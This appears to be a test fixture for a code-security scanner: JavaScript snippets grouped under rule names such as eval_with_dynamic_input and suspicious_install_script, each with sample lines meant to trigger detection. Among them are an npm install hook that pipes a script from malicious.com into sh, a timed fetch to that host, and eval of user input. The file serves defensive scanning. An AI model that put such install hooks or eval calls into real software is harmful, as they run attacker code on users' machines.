```javascript
// eval_with_dynamic_input
eval(userInput); // Dangerous: eval with user input
const dynamicEval = eval("2 + 2"); // Another eval example

// obfuscated_code_pattern
const _0xabc123 = function() { return "Hello World"; }; // Obfuscated function
const _0x123abc = () => { return "Test"; }; // Another obfuscated example

// hex_array_obfuscation
const hexArray = [0x48, 0x65, 0x6c, 0x6c, 0x6f]; // Hex array
const str = String.fromCharCode(...hexArray); // Convert hex to string

// function_deobfuscation_pattern
function obfuscated() { return "I am obfuscated"; } // Obfuscated function
const deobfuscated = function() { return "I am clear"; }; // Another obfuscated function

// suspicious_setTimeout
setTimeout(() => { eval("console.log('Executed after delay');"); }, 1000); // Suspicious timeout
setTimeout("alert('This is bad!');", 1000); // Another suspicious timeout

// suspicious_setInterval
setInterval(() => { fetch('http://malicious.com'); }, 2000); // Suspicious interval
setInterval("console.log('Running every second');", 1000); // Another suspicious interval

// leak_private_key_http
fetch("http://example.com?key=12345"); // Leaking private key
const apiKey = "12345"; fetch(`http://example.com?key=${apiKey}`); // Another leak example

// suspicious_install_script
"scripts": {
  "start": "node server.js",
  "install": "curl http://malicious.com/script.sh | sh" // Suspicious install script
}

// python_exec_eval
// python
// exec("print('Hello from Python')") // Simulating Python exec
// python
// eval("print('Python eval')") // Another simulated Python eval

// python_requests_with_sensitive
// python
// requests.get('http://example.com/api?key=secret_key') // Simulating Python request with sensitive data
// python
// requests.post('http://example.com/api', data={'key': 'secret_key'}) // Another simulated request

// go_http_request
// go
// http.Get("http://example.com") // Simulating Go HTTP request
// go
// http.Post("http://example.com", "application/json", body) // Another simulated Go request

// rust_http_with_sensitive
// rust
// reqwest::blocking::get("http://example.com?key=secret_key").unwrap(); // Simulating Rust HTTP request
// rust
// reqwest::blocking::Client::new().get("http://example.com").send().unwrap(); // Another simulated Rust request

// minified_obfuscated_large_function
const a = (b,c)=>{return b+c};const d = a(1,2); // Minified and obfuscated function
const x = (y,z)=>{return y*z};const result = x(3,4); // Another minified example
```
